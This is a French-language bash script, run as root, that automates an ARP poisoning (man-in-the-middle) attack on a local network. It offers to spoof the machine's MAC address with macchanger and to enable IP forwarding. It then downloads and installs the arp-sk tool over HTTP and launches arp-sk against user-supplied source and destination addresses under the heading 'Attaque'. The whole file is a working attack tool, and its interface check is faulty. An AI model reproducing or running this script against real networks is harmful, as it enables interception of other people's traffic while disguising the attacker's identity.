#!/bin/bash

set -e
set -u

if [ $# -gt "0" ]
then
	echo -e "No arguments used with this script\n"
	exit 1
fi

if [ $(whoami) != "root" ]
then
	echo -e "Connectez-vous en root pour continuer\n"
	exit 1
fi

echo -e "\n################################################################################"
echo "################################################################################"
echo " 		  ______   ___ ___  __    __  __        __"
echo "		 /\\     \\ |\\  \\\\  \\|\\ \\  |\\ \\|\\ \\      |\\ \\"
echo "		|\\ ######\\| ##/ ##/| ##  | ##| ##      | ##"
echo "		| ##___\\##| ## ##/ | ##  | ##| ##      | ##"
echo "		 \\##\   \\ | ####/  | ##  | ##| ##      | ##"
echo "		 _\######\| ###(   | ## _| ##| ##      | ##"
echo "		|  \\__| ##| ####\\  | ##/ \\ ##| ##_____ | ##_____"
echo "		 \\##   \\##| ## ##\\  \\## ## ##| ##\\    \\| ##\\   \\"
echo -e " 		  \\######  \\##\\_##\\  \\######\\ \\######## \\########\n"
echo "################################################################################"
echo -e "################################################################################\n"

echo -e "\n================================================================================"
echo -e "\t\tBienvenue dans le programme d'ARP Poisoning !!"
echo -e "================================================================================\n"

echo -e "\n================================================================================"
read -p '			Votre interface réseau : ' interface

until [[ "$interface" != "wlan*" || "$interface" != "eth*" ]]
do
	if [[ "$interface" != "wlan*" || "$interface" != "eth*" ]]
	then
		echo -e "Saisissez une interface existante\n"
		read -p '			Votre interface réseau : ' interface
	fi
done 

ip=$(ifconfig $interface | grep "inet ad" | cut -f2 -d: | awk '{print $1}')

echo -e "\n\t\t    Votre adresse ip locale est : $ip"

mac=$(ifconfig $interface | grep "HWaddr" | cut -d ' ' -f 10 | awk '{print $1}')

echo -e "\n\t\tVotre adresse mac actuelle est : $mac"
echo -e "================================================================================\n"

echo -e "\n================================================================================"

macChange=""

until [[ "$macChange" = "oui" || "$macChange" = "o" || "$macChange" = "n" || "$macChange" = "non" ]]
do
	read -p "	    Voulez vous changez votre adresse mac ?? (oui ou non) : " macChange
	echo -e "$macChange\n"
done

if [[ "$macChange" = "oui" || "$macChange" = "o" ]]
	then
		if [[ -z "$(dpkg -l | grep 'macchanger')" ]]
		then
			apt-get install macchanger
		fi
		ifconfig $interface down
		changementMac=`macchanger -r $interface`
		ifconfig $interface up

		newMac=`macchanger $interface | grep "Current" | cut -f2- -d: | awk '{print$1}'`

		echo -e "\n\t\tVotre nouvelle adresse mac est : $newMac"
fi

echo -e "================================================================================\n"

echo -e "\n================================================================================"

routeur=""

until [[ "$routeur" = "oui" || "$routeur" = "o" || "$routeur" = "n" || "$routeur" = "non" ]]
do
	read -p "		Se configurer en routeur ?? (oui ou non) : " routeur
done

if [[ "$routeur" = "oui" || "$routeur" = "o" ]]
	then
		echo 1 > /proc/sys/net/ipv4/ip_forward
		echo -e "\n \t\t\t\t\tDONE"

else echo 0 > /proc/sys/net/ipv4/ip_forward
	 echo -e "\n \t\t\t\t\tDONE"

fi


echo -e "================================================================================\n"

echo -e "\n================================================================================"

#read -p "			Installer le paquet arp-sk ? (oui ou non) : " installArp
installArp=""

until [[ "$installArp" = "oui" || "$installArp" = "o" || "$installArp" = "n" || "$installArp" = "non" ]]
do
	read -p "			Installer le paquet arp-sk ? (oui ou non) : " installArp
done

if [[ "$installArp" = "oui" || "$installArp" = "o" ]]
then
	if [[ -z "$(dpkg -l | grep 'arp-sk')" ]]
	then
		dpkg --add-architecture i386
		apt-get install libc6
		apt-get install libnet1
		apt-get update
		apt-get upgrade
		wget http://debian.zorglub.org/packages/arp-sk/arp-sk_0.0.16-1_i386.deb
		dpkg -i arp-sk_0.0.16-1_i386.deb
		apt-get -f install
	fi
elif [ -z "$(dpkg -l | grep 'arp-sk')" ]
then
	echo "Installez le paquet d'Arp Poisoning"
	exit 1
fi


echo -e "================================================================================\n"

echo -e "\n================================================================================"

echo -e "\t\t      ========= ARP POISONING =========\n"

read -p "	    	Adresse ip de la source : " adresseSource

echo ""

read -p "	    	Adresse ip de destination : " adresseDestination

echo -e "================================================================================\n\n"

echo -e "\t\t\t\t  Attaque :\n\n"

arp-sk -s $ip -d $adresseDestination -S $adresseSource -D $adresseDestination -T u10000 -i $interface
